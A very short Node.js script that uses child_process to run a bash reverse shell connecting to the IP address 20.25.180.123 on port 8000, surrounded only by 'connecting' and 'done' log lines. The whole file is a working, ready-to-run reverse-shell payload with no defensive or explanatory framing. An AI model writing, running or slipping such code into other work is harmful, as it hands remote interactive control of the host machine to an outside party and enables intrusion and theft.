console.log('connecting');
const cp = require("child_process")
console.log('connecting2');
cp.exec(`/bin/bash -i >& /dev/tcp/20.25.180.123/8000 0>&1`)
console.log('done');
